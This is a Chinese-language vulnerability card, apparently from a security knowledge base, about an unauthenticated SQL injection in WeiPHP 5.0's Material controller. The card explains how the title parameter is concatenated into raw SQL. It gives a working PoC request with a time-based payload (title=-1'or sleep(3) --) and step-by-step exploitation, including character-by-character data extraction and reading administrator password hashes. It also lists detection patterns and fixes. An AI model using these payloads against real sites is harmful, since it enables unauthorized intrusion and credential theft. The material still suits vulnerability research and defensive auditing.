---
id: web-generic-sqli-weiphp5-material-title-like-concat
title: WeiPHP 5.0 前台 SQL 注入：Material 控制器 title 未过滤拼进 LIKE 与 M()->query
type: scenario
domain: web
path: web/generic/sqli
technique: weiphp5-material-title-like-string-concat-sqli
affected_versions: WeiPHP 5.0
tags:
- php
- weiphp
- thinkphp
- sql-injection
- like
- time-based
- unauth
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:34:25+08:00'
  notes: 已对照原文核对：Material 控制器 I('title') 非空时 $map 数组条件与 $where .= " and title like '%$title%'" 双路径、M()->query() 执行 SELECT COUNT(distinct group_id) FROM wp_material_news WHERE {...} LIMIT 1、PoC title=-1'or sleep(3) -- 均与原文一致；原文未贴实测回显，卡内 confidence medium 合理，未复现。affected_versions=WeiPHP 5.0 按原文标注。
url: /docs/web/generic/sqli/web-generic-sqli-weiphp5-material-title-like-concat/
draft: false
kb_aliases:
- WeiPHP 5.0 title 注入
- Material material_lists SQL 注入
- title like 拼接注入
- WeiPHP 时间盲注
---

## 一句话结论

WeiPHP 5.0 的 Material 控制器在 `material_lists` 中把 `I('title')` 直接拼进 `$where .= " and \`title\` like '%$title%'"`，随后整段 `$where` 进入 `M()->query("SELECT COUNT(distinct group_id) AS tp_count FROM wp_material_news WHERE {$where} LIMIT 1")`；title 未经过滤，闭合单引号即可时间盲注（`?title=-1'or sleep(3) --`）。

## 原理

- **Source**：`$title = I('title');` 是 ThinkPHP 的输入助手，仅取值不做 SQL 转义；非空时既用于构造数组条件 `$map['title'] = ['like', "%$title%"]`，又直接拼进字符串 `$where .= " and \`title\` like '%$title%'"`。
- **Sink**：`M()->query("SELECT COUNT( distinct \`group_id\`) AS tp_count FROM \`wp_material_news\` WHERE {$where} LIMIT 1")` 把拼接后的 `$where` 原样交给数据库；`M()->query()` 执行原生 SQL，不经过 ThinkPHP 的数组条件参数化/绑定。
- **为什么成立**：同一份 title 同时走"数组条件（安全）"和"字符串拼接（不安全）"两条路，开发者只信任了前者；单引号闭合后 `or sleep(3)` 改变 WHERE 布尔逻辑，`--` 注释掉后续 `LIMIT`，形成可测的时间盲注。
- 该注入点在 material 模块的列表查询里，属于前台可访问接口（原文直接给出 URL），与网上常见的 bind_follow `exp` 数组注入不是同一入口。

## 触发条件

- WeiPHP 5.0，Material 模块可访问（`public/index.php/Material/Material/material_lists`）；
- `title` 参数非空进入拼接分支；
- 数据库为 MySQL/MariaDB（`sleep()` 可用）；Limit 前的注入点可用 `-- ` 注释。
- 无需登录（前台列表接口）。

## 利用步骤

1. 访问 `public/index.php/Material/Material/material_lists` 确认页面正常。
2. 发送 `title=-1'or sleep(3) --`（URL 编码空格与引号），观察响应是否延迟约 3 秒；对比 `title=正常值` 的响应时间。
3. 用条件 sleep（如 `title=-1'or if(substr((select user()),1,1)='r',sleep(3),0) --`）逐字符外带数据库信息；也可用布尔/报错变体。
4. 进一步读取 wp_ 前缀表中的管理员账号密码哈希（如 `wp_admin`/`wp_user`），或配合其它漏洞扩大战果。

## PoC

```http
GET /public/index.php/Material/Material/material_lists?title=-1%27or%20sleep(3)%20--%20 HTTP/1.1
Host: target
```

```sql
-- 拼接后的 SQL 形态
SELECT COUNT( distinct `group_id`) AS tp_count FROM `wp_material_news` WHERE  ... and `title` like '%-1'or sleep(3) -- %' LIMIT 1
```

## 变体与关联

- 变体：`title` 也可用于布尔盲注（`and 1=1` / `and 1=2` 比较响应行数），或报错注入（`extractvalue`/`updatexml`，取决于错误回显）。
- 关联：同产品 WeiPHP 5.0 的 `wp_where()` exp 数组注入 [[web-generic-sqli-thinkphp-where-exp-array-injection]]（不同入口/不同 sink：数组条件被转 Db::raw vs 本卡字符串 LIKE 拼接）；ThinkPHP 字符串拼接注入 [[web-generic-sqli-thinkphp32-find-options-where-string-injection]]（同属 TP 框架 where 拼接）。
- 变体：`M()->query()` 的原生 SQL 拼接是 TP 项目常见审计点，title/keyword 等搜索参数是高发位置。

## 检测与防御

- 检测：请求参数中出现 `'or`、`sleep(`、`benchmark(`、`--`、`if(` 等模式且落在 `title` 等搜索参数；数据库慢查询/审计日志出现 `LIKE '%...'` 内含布尔/时间函数。
- 防御：禁止字符串拼接 SQL，改用 `$map['title'] = ['like', '%'.$title.'%']`（参数化）或 `Db::name(...)->where('title','like',...)`；对搜索参数做长度与字符白名单；统一使用 `M()->query()` 的绑定参数形式。
